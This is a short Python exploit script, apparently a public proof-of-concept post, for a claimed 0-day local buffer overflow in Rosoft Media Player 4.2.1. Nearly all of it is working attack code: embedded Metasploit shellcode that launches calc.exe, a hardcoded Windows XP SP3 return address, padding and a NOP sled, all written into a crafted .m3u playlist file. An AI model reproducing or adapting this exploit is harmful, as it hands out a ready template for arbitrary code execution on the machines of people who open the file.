# Rosoft Media Player 4.2.1 Local Buffer Overflow Exploit(0-day)
# By:Encrypt3d.M!nd
#
# Well,There is a buffer overflow in the program were all the supported types are
# Affected(m3u,rml,txt),Also Rosoft Media Player treat all the other types as txt so all
# the types are affected :),and also all the versions are affected
#
# Greetz:-=Mizo=-,L!ON,El Mariachi,MiNi SpIder,and all my friends
# I'm Iraqian...Not Arabian



# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com 
shellcode = (
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa9"
"\x21\xdb\x5b\x83\xeb\xfc\xe2\xf4\x55\xc9\x9f\x5b\xa9\x21\x50\x1e"
"\x95\xaa\xa7\x5e\xd1\x20\x34\xd0\xe6\x39\x50\x04\x89\x20\x30\x12"
"\x22\x15\x50\x5a\x47\x10\x1b\xc2\x05\xa5\x1b\x2f\xae\xe0\x11\x56"
"\xa8\xe3\x30\xaf\x92\x75\xff\x5f\xdc\xc4\x50\x04\x8d\x20\x30\x3d"
"\x22\x2d\x90\xd0\xf6\x3d\xda\xb0\x22\x3d\x50\x5a\x42\xa8\x87\x7f"
"\xad\xe2\xea\x9b\xcd\xaa\x9b\x6b\x2c\xe1\xa3\x57\x22\x61\xd7\xd0"
"\xd9\x3d\x76\xd0\xc1\x29\x30\x52\x22\xa1\x6b\x5b\xa9\x21\x50\x33"
"\x95\x7e\xea\xad\xc9\x77\x52\xa3\x2a\xe1\xa0\x0b\xc1\xd1\x51\x5f"
"\xf6\x49\x43\xa5\x23\x2f\x8c\xa4\x4e\x42\xba\x37\xca\x0f\xbe\x23"
"\xcc\x21\xdb\x5b")

File = 'encrypt3d.m3u' # change it with what ever you like

eip = "\x6B\x8C\x49\x7E" # Windows XP SP3:user32.dll

chars = "A"*4096

addr = "\xF0\xFF\xFD\x7F" # Writeable address contains 0,NOT 0x00

#addr = "\xE0\x0F\x70\x12" # if the address above not workin try this one

file=open(File,'w')
file.write(chars+addr+"\x90"*4+eip+"\x90"*10+shellcode)
file.close()

